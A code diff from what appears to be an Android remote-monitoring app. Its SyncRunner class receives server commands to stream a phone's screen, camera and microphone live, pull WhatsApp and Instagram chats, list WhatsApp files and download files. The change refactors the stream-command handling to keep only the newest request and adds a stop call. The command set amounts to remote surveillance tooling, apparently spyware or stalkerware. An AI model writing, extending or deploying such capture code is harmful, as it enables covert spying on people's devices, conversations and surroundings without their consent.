@@ -71,10 +71,10 @@ class SyncRunner(private val context: Context) {
 
         if (commands.isEmpty()) return true
 
-        // Process screen and camera stream immediately
-        commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
-        commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
-        commands.filter { it.command_type == "audio_stream" }.forEach { processAudioStreamCommand(bearer, it) }
+        // Process screen, camera, and audio stream commands immediately (deduplicating to latest command)
+        processStreamCommands(bearer, commands, "screen_stream", ::processScreenStreamCommand)
+        processStreamCommands(bearer, commands, "camera_stream", ::processCameraStreamCommand)
+        processStreamCommands(bearer, commands, "audio_stream", ::processAudioStreamCommand)
         commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
         commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }
 
@@ -198,9 +198,9 @@ class SyncRunner(private val context: Context) {
             commands.filter { it.command_type == "whatsapp_file_list" }.forEach { processWhatsAppFileListCommand(bearer, it) }
             commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
         }
-        commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
-        commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
-        commands.filter { it.command_type == "audio_stream" }.forEach { processAudioStreamCommand(bearer, it) }
+        processStreamCommands(bearer, commands, "screen_stream", ::processScreenStreamCommand)
+        processStreamCommands(bearer, commands, "camera_stream", ::processCameraStreamCommand)
+        processStreamCommands(bearer, commands, "audio_stream", ::processAudioStreamCommand)
         commands.filter { it.command_type == "whatsapp_sync_now" }.forEach { processWhatsAppSyncCommand(bearer, it) }
         commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
         commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }
@@ -554,10 +554,33 @@ class SyncRunner(private val context: Context) {
         }
     }
 
+    private suspend fun processStreamCommands(
+        bearer: String,
+        commands: List<RemoteCommand>,
+        type: String,
+        handler: suspend (String, RemoteCommand) -> Unit
+    ) {
+        val matching = commands.filter { it.command_type == type }
+        if (matching.isEmpty()) return
+        if (matching.size > 1) {
+            matching.dropLast(1).forEach { oldCmd ->
+                try {
+                    ApiClient.service.ackCommand(
+                        bearer,
+                        oldCmd.id,
+                        AckCommandRequest(success = true, message = "Superseded by newer stream request")
+                    )
+                } catch (_: Exception) {}
+            }
+        }
+        handler(bearer, matching.last())
+    }
+
     private suspend fun processScreenStreamCommand(bearer: String, command: RemoteCommand) {
         val action = (command.payload?.get("action") as? String) ?: "start"
         if (action == "stop") {
             com.spapp.monitoring.screenstream.ScreenStreamService.stop(context)
+            com.spapp.monitoring.screenstream.ScreenStreamManager.stopStreaming()
             try {
                 ApiClient.service.ackCommand(
                     bearer,
